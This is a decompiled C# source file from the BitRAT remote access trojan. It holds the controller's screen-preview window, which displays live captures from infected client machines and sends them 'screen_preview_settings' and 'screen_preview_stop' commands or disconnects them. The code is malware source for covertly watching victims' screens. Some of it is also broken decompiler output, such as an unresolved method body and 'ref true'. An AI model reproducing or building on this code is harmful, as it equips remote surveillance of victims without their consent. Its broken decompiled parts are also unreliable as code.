﻿using BitRAT;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Zeroit.Framework.Progress;

[DesignerGenerated]
public sealed class fPreview : Form
{
    private IContainer icontainer_0;
    private PictureBox pictureBox_0;
    private Timer timer_0;
    private Timer timer_1;
    private Timer timer_2;
    private Label label_0;
    private Timer timer_3;
    private ZeroitWin8ProgressRing zeroitWin8ProgressRing_0;
    private Label label_1;
    private Timer timer_4;
    public string string_0;
    public string string_1;
    public string string_2;
    public string string_3;
    public string string_4;
    public string string_5;
    public Point point_0;
    private long long_0;
    private long long_1;
    public bool bool_0;

    public fPreview()
    {
        base.Load += new EventHandler(this.fPreview_Load);
        base.Resize += new EventHandler(this.fPreview_Resize);
        base.VisibleChanged += new EventHandler(this.fPreview_VisibleChanged);
        this.bool_0 = false;
        this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    private void fPreview_Load(object sender, EventArgs e)
    {
        base.Visible = false;
        base.Width = (int) Math.Round(Conversion.Val(Class130.fSettings_0.vmethod_92().Text));
        base.Height = (int) Math.Round(Conversion.Val(Class130.fSettings_0.vmethod_86().Text));
        this.vmethod_12().set_Animate(false);
        string[] textArray1 = new string[] { this.string_2, "^", this.string_3, " - ", this.string_5 };
        this.vmethod_8().Text = string.Concat(textArray1);
        this.method_7();
    }

    private void fPreview_Resize(object sender, EventArgs e)
    {
        this.vmethod_0().Left = 0;
        this.vmethod_0().Top = this.vmethod_8().Top + this.vmethod_8().Height;
        this.vmethod_0().Width = base.Width;
        this.vmethod_0().Height = Conversions.ToInteger(Operators.SubtractObject(base.Height - this.vmethod_8().Height, Interaction.IIf(this.vmethod_14().Visible, this.vmethod_14().Height, 0)));
        this.vmethod_12().Left = (int) Math.Round((double) ((((double) base.Width) / 2.0) - (((double) this.vmethod_12().Width) / 2.0)));
        this.vmethod_12().Top = (int) Math.Round((double) ((((double) base.Height) / 2.0) - (((double) this.vmethod_12().Height) / 2.0)));
        this.vmethod_12().set_Animate(true);
        this.vmethod_8().Width = base.Width;
        this.vmethod_14().Width = base.Width - 20;
    }

    private void fPreview_VisibleChanged(object sender, EventArgs e)
    {
        this.vmethod_0().Left = 0;
        this.vmethod_0().Top = this.vmethod_8().Top + this.vmethod_8().Height;
        this.vmethod_0().Width = base.Width;
        this.vmethod_0().Height = Conversions.ToInteger(Operators.SubtractObject(base.Height - this.vmethod_8().Height, Interaction.IIf(this.vmethod_14().Visible, this.vmethod_14().Height, 0)));
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        this.vmethod_3(new Timer(this.icontainer_0));
        this.vmethod_5(new Timer(this.icontainer_0));
        this.vmethod_7(new Timer(this.icontainer_0));
        this.vmethod_9(new Label());
        this.vmethod_11(new Timer(this.icontainer_0));
        this.vmethod_1(new PictureBox());
        this.vmethod_13(new ZeroitWin8ProgressRing());
        this.vmethod_15(new Label());
        this.vmethod_17(new Timer(this.icontainer_0));
        ((ISupportInitialize) this.vmethod_0()).BeginInit();
        base.SuspendLayout();
        this.vmethod_2().Interval = 1;
        this.vmethod_4().Interval = 1;
        this.vmethod_6().Interval = 1;
        this.vmethod_8().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Top;
        this.vmethod_8().BackColor = Color.Transparent;
        this.vmethod_8().ForeColor = Color.Black;
        this.vmethod_8().Location = new Point(0, 0);
        this.vmethod_8().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_8().Name = "lblCaption";
        this.vmethod_8().Size = new Size(0x215, 14);
        this.vmethod_8().TabIndex = 0x1d;
        this.vmethod_8().TextAlign = ContentAlignment.TopCenter;
        this.vmethod_10().Interval = 1;
        this.vmethod_0().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Top;
        this.vmethod_0().BorderStyle = BorderStyle.FixedSingle;
        this.vmethod_0().Location = new Point(1, 0x10);
        this.vmethod_0().Margin = new Padding(2);
        this.vmethod_0().Name = "pbPreview";
        this.vmethod_0().Size = new Size(0x213, 0x106);
        this.vmethod_0().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_0().TabIndex = 0x1c;
        this.vmethod_0().TabStop = false;
        this.vmethod_12().set_Animate(false);
        this.vmethod_12().BackColor = Color.Transparent;
        this.vmethod_12().set_ControlHeight(80);
        this.vmethod_12().Location = new Point(0xd3, 0x60);
        this.vmethod_12().Margin = new Padding(2);
        this.vmethod_12().Name = "ziLoader";
        this.vmethod_12().set_RefreshRate(100);
        this.vmethod_12().Size = new Size(80, 80);
        this.vmethod_12().TabIndex = 30;
        this.vmethod_14().BackColor = Color.Transparent;
        this.vmethod_14().Dock = DockStyle.Bottom;
        this.vmethod_14().ForeColor = Color.Black;
        this.vmethod_14().Location = new Point(0, 0x116);
        this.vmethod_14().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_14().Name = "lblData";
        this.vmethod_14().Size = new Size(0x215, 14);
        this.vmethod_14().TabIndex = 0x1f;
        this.vmethod_14().TextAlign = ContentAlignment.TopRight;
        this.vmethod_16().Enabled = true;
        this.vmethod_16().Interval = 1;
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        this.BackColor = Color.SkyBlue;
        base.ClientSize = new Size(0x215, 0x124);
        base.ControlBox = false;
        base.Controls.Add(this.vmethod_14());
        base.Controls.Add(this.vmethod_12());
        base.Controls.Add(this.vmethod_8());
        base.Controls.Add(this.vmethod_0());
        this.DoubleBuffered = true;
        base.FormBorderStyle = FormBorderStyle.None;
        base.Margin = new Padding(2);
        base.MaximizeBox = false;
        base.MinimizeBox = false;
        base.Name = "fPreview";
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        this.Text = "fScreenPreview";
        base.TopMost = true;
        ((ISupportInitialize) this.vmethod_0()).EndInit();
        base.ResumeLayout(false);
    }

    private void method_0()
    {
        this.vmethod_12().Left = (int) Math.Round((double) ((((double) base.Width) / 2.0) - (((double) this.vmethod_12().Width) / 2.0)));
        this.vmethod_12().Top = (int) Math.Round((double) ((((double) base.Height) / 2.0) - (((double) this.vmethod_12().Height) / 2.0)));
        this.vmethod_12().set_Animate(true);
        Point position = Cursor.Position;
        base.Left = (int) Math.Round((double) (position.X - (((double) base.Width) / 2.0)));
        base.Top = (int) Math.Round((double) (position.Y - (((double) base.Height) / 2.0)));
    }

    private void method_1()
    {
        Point position = Cursor.Position;
        base.Left = position.X - ((int) this.long_0);
        base.Top = position.Y - ((int) this.long_1);
    }

    private void method_10(object sender, MouseEventArgs e)
    {
        this.method_2();
        MouseButtons button = e.Button;
        if (button == MouseButtons.Left)
        {
            this.vmethod_6().Enabled = true;
        }
        else if (button == MouseButtons.Right)
        {
            if (Class130.concurrentDictionary_3.ContainsKey(this.string_0))
            {
                bool flag = true;
                CClient client = Class130.concurrentDictionary_3[this.string_0];
                if ((client.fPr != null) && client.fPr.Visible)
                {
                    if (flag)
                    {
                        client.fPr.method_6();
                    }
                    Class136.Class138 class2 = new Class136.Class138();
                    class2.string_0 = client.sKey;
                    class2.string_1 = "screen_preview_stop|1";
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    client.fPr.vmethod_8().ForeColor = Color.Red;
                    client.fPr.vmethod_14().Text = "Disconnected";
                    client.fPr.vmethod_14().ForeColor = Color.Red;
                }
                client.PREVIEW_SCREEN_IS_ENABLED = false;
            }
            this.method_9();
        }
    }

    private void method_11(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Left)
        {
            this.vmethod_6().Enabled = false;
        }
    }

    private void method_12(object sender, MouseEventArgs e)
    {
        this.method_2();
        MouseButtons button = e.Button;
        if (button == MouseButtons.Left)
        {
            this.vmethod_6().Enabled = true;
        }
        else if (button == MouseButtons.Right)
        {
            if (Class130.concurrentDictionary_3.ContainsKey(this.string_0))
            {
                bool flag = true;
                CClient client = Class130.concurrentDictionary_3[this.string_0];
                if ((client.fPr != null) && client.fPr.Visible)
                {
                    if (flag)
                    {
                        client.fPr.method_6();
                    }
                    Class136.Class138 class2 = new Class136.Class138();
                    class2.string_0 = client.sKey;
                    class2.string_1 = "screen_preview_stop|1";
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    client.fPr.vmethod_8().ForeColor = Color.Red;
                    client.fPr.vmethod_14().Text = "Disconnected";
                    client.fPr.vmethod_14().ForeColor = Color.Red;
                }
                client.PREVIEW_SCREEN_IS_ENABLED = false;
            }
            this.method_9();
        }
    }

    private void method_13(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Left)
        {
            this.vmethod_6().Enabled = false;
        }
    }

    private void method_14(object sender, EventArgs e)
    {
        Class136.Class138 class2;
        if (this.bool_0)
        {
            base.Width -= 8;
            base.Height = (int) Math.Round((double) (base.Height - ((((double) Class135.smethod_0().PreviewDefaultY) / ((double) Class135.smethod_0().PreviewDefaultX)) * 8.0)));
            if (base.Width <= Class135.smethod_0().PreviewDefaultX)
            {
                base.Width = Class135.smethod_0().PreviewDefaultX;
                base.Height = Class135.smethod_0().PreviewDefaultY;
                this.bool_0 = false;
                string[] textArray2 = new string[] { "screen_preview_settings|", Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval), "|", Conversions.ToString(Class135.smethod_0().PreviewQuality), "|" };
                class2 = new Class136.Class138();
                class2.string_0 = this.string_0;
                class2.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(textArray2), Interaction.IIf(this.bool_0, Class135.smethod_0().PreviewDoubleClickSize, Class135.smethod_0().PreviewDefaultSize)), "|"), base.Width), "|"), base.Height));
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
                this.vmethod_10().Enabled = false;
            }
        }
        else
        {
            base.Width += 8;
            base.Height = (int) Math.Round((double) (base.Height + ((((double) Class135.smethod_0().PreviewDoubleClickY) / ((double) Class135.smethod_0().PreviewDoubleClickX)) * 8.0)));
            if (base.Width >= Class135.smethod_0().PreviewDoubleClickX)
            {
                base.Width = Class135.smethod_0().PreviewDoubleClickX;
                base.Height = Class135.smethod_0().PreviewDoubleClickY;
                this.bool_0 = true;
                string[] textArray1 = new string[] { "screen_preview_settings|", Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval), "|", Conversions.ToString(Class135.smethod_0().PreviewQuality), "|" };
                class2 = new Class136.Class138();
                class2.string_0 = this.string_0;
                class2.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(textArray1), Interaction.IIf(this.bool_0, Class135.smethod_0().PreviewDoubleClickSize, Class135.smethod_0().PreviewDefaultSize)), "|"), base.Width), "|"), base.Height));
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
                this.vmethod_10().Enabled = false;
            }
        }
    }

    private void method_15(object sender, EventArgs e)
    {
        this.vmethod_10().Enabled = true;
    }

    public void method_16()
    {
        this.vmethod_0().Image = null;
        this.vmethod_0().BackColor = Color.Empty;
        this.vmethod_0().Invalidate();
        if (this.vmethod_12().InvokeRequired)
        {
            this.vmethod_12().Invoke(new Delegate43(this.method_16), new object[0]);
        }
        else
        {
            this.vmethod_12().set_Animate(true);
            this.vmethod_12().Visible = true;
        }
    }

    public void method_17()
    {
        if (this.vmethod_12().InvokeRequired)
        {
            this.vmethod_12().Invoke(new Delegate47(this.method_17), new object[0]);
        }
        else
        {
            this.vmethod_12().set_Animate(false);
            this.vmethod_12().Visible = false;
        }
    }

    public void method_18(long long_2, double double_0, double double_1)
    {
        // Unresolved stack state at '0000000D'
    }

    private void method_19(object sender, EventArgs e)
    {
    }

    private void method_2()
    {
        this.point_0 = Cursor.Position;
        this.long_0 = this.point_0.X - base.Left;
        this.long_1 = this.point_0.Y - base.Top;
    }

    private void method_20(object sender, EventArgs e)
    {
        this.vmethod_0().Left = 0;
        this.vmethod_0().Top = this.vmethod_8().Top + this.vmethod_8().Height;
        this.vmethod_0().Width = base.Width;
        this.vmethod_0().Height = Conversions.ToInteger(Operators.SubtractObject(base.Height - this.vmethod_8().Height, Interaction.IIf(this.vmethod_14().Visible, this.vmethod_14().Height, 0)));
    }

    public void method_21()
    {
        if (this.vmethod_14().InvokeRequired)
        {
            this.vmethod_14().Invoke(new Delegate44(this.method_21), new object[0]);
        }
        else
        {
            this.vmethod_14().Visible = false;
        }
    }

    public void method_3(string string_6, string string_7, string string_8, string string_9, string string_10)
    {
        this.string_2 = string_6;
        this.string_4 = string_7;
        this.string_3 = string_8;
        this.string_5 = string_9;
        this.string_0 = string_10;
        string[] textArray1 = new string[] { string_6, "^", string_8, " - ", string_9 };
        this.vmethod_8().Text = string.Concat(textArray1);
    }

    private void method_4(object sender, EventArgs e)
    {
        if (!Class135.smethod_0().PreviewTransparentFrames)
        {
            base.Opacity = 100.0;
            base.Visible = true;
            this.Refresh();
            this.vmethod_2().Tag = "0";
            this.vmethod_2().Enabled = false;
        }
        else
        {
            if (Conversion.Val(this.vmethod_2().Tag) == 80.0)
            {
                base.Opacity = 80.0;
                base.Visible = true;
                this.vmethod_2().Tag = "0";
            }
            this.vmethod_2().Tag = Conversion.Val(this.vmethod_2().Tag) + 10.0;
            base.Opacity = Conversion.Val(Operators.DivideObject(this.vmethod_2().Tag, (int) 100));
            this.Refresh();
            if (Conversion.Val(this.vmethod_2().Tag) == 80.0)
            {
                this.vmethod_2().Enabled = false;
            }
        }
    }

    private void method_5(object sender, EventArgs e)
    {
        if (!Class135.smethod_0().PreviewTransparentFrames)
        {
            base.Opacity = 0.0;
            this.Refresh();
            this.vmethod_4().Tag = 0;
            base.Visible = false;
            this.vmethod_4().Enabled = false;
        }
        else
        {
            if (Conversion.Val(this.vmethod_4().Tag) == 0.0)
            {
                this.vmethod_4().Tag = "80";
                base.Opacity = 80.0;
                base.Visible = true;
            }
            this.vmethod_4().Tag = Conversion.Val(this.vmethod_4().Tag) - 10.0;
            base.Opacity = Conversion.Val(Operators.DivideObject(this.vmethod_4().Tag, (int) 100));
            this.Refresh();
            if (Conversion.Val(this.vmethod_4().Tag) == 0.0)
            {
                base.Visible = false;
                this.vmethod_4().Enabled = false;
            }
        }
    }

    public void method_6()
    {
        if (base.InvokeRequired)
        {
            base.Invoke(new Delegate45(this.method_6), new object[0]);
        }
        else if ((Operators.CompareString(this.string_1, null, true) != 0) && Class130.concurrentDictionary_3.ContainsKey(this.string_1))
        {
            Class130.concurrentDictionary_3[this.string_1].SOCKET_DISCONNECT(ref true);
        }
    }

    public void method_7()
    {
        if (base.InvokeRequired)
        {
            base.Invoke(new Delegate46(this.method_7), new object[0]);
        }
        else
        {
            this.method_0();
            this.vmethod_2().Enabled = true;
        }
    }

    private void method_8(object sender, EventArgs e)
    {
        this.method_1();
    }

    public void method_9()
    {
        if (base.InvokeRequired)
        {
            base.Invoke(new Delegate48(this.method_9), new object[0]);
        }
        else
        {
            this.vmethod_4().Enabled = true;
        }
    }

    internal virtual PictureBox vmethod_0()
    {
        return this.pictureBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(PictureBox pictureBox_1)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_10);
        MouseEventHandler handler2 = new MouseEventHandler(this.method_11);
        EventHandler handler3 = new EventHandler(this.method_15);
        EventHandler handler4 = new EventHandler(this.method_19);
        PictureBox box = this.pictureBox_0;
        if (box != null)
        {
            box.MouseDown -= handler;
            box.MouseUp -= handler2;
            box.DoubleClick -= handler3;
            box.Click -= handler4;
        }
        this.pictureBox_0 = pictureBox_1;
        box = this.pictureBox_0;
        if (box != null)
        {
            box.MouseDown += handler;
            box.MouseUp += handler2;
            box.DoubleClick += handler3;
            box.Click += handler4;
        }
    }

    internal virtual Timer vmethod_10()
    {
        return this.timer_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(Timer timer_5)
    {
        EventHandler handler = new EventHandler(this.method_14);
        Timer timer = this.timer_3;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_3 = timer_5;
        timer = this.timer_3;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual ZeroitWin8ProgressRing vmethod_12()
    {
        return this.zeroitWin8ProgressRing_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(ZeroitWin8ProgressRing zeroitWin8ProgressRing_1)
    {
        this.zeroitWin8ProgressRing_0 = zeroitWin8ProgressRing_1;
    }

    internal virtual Label vmethod_14()
    {
        return this.label_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(Label label_2)
    {
        this.label_1 = label_2;
    }

    internal virtual Timer vmethod_16()
    {
        return this.timer_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(Timer timer_5)
    {
        EventHandler handler = new EventHandler(this.method_20);
        Timer timer = this.timer_4;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_4 = timer_5;
        timer = this.timer_4;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual Timer vmethod_2()
    {
        return this.timer_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(Timer timer_5)
    {
        EventHandler handler = new EventHandler(this.method_4);
        Timer timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_0 = timer_5;
        timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual Timer vmethod_4()
    {
        return this.timer_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(Timer timer_5)
    {
        EventHandler handler = new EventHandler(this.method_5);
        Timer timer = this.timer_1;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_1 = timer_5;
        timer = this.timer_1;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual Timer vmethod_6()
    {
        return this.timer_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(Timer timer_5)
    {
        EventHandler handler = new EventHandler(this.method_8);
        Timer timer = this.timer_2;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_2 = timer_5;
        timer = this.timer_2;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual Label vmethod_8()
    {
        return this.label_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(Label label_2)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_12);
        MouseEventHandler handler2 = new MouseEventHandler(this.method_13);
        Label label = this.label_0;
        if (label != null)
        {
            label.MouseDown -= handler;
            label.MouseUp -= handler2;
        }
        this.label_0 = label_2;
        label = this.label_0;
        if (label != null)
        {
            label.MouseDown += handler;
            label.MouseUp += handler2;
        }
    }

    private delegate void Delegate43();

    private delegate void Delegate44();

    private delegate void Delegate45();

    private delegate void Delegate46();

    private delegate void Delegate47();

    private delegate void Delegate48();

    private delegate void Delegate49(long long_0, double double_0, double double_1);
}

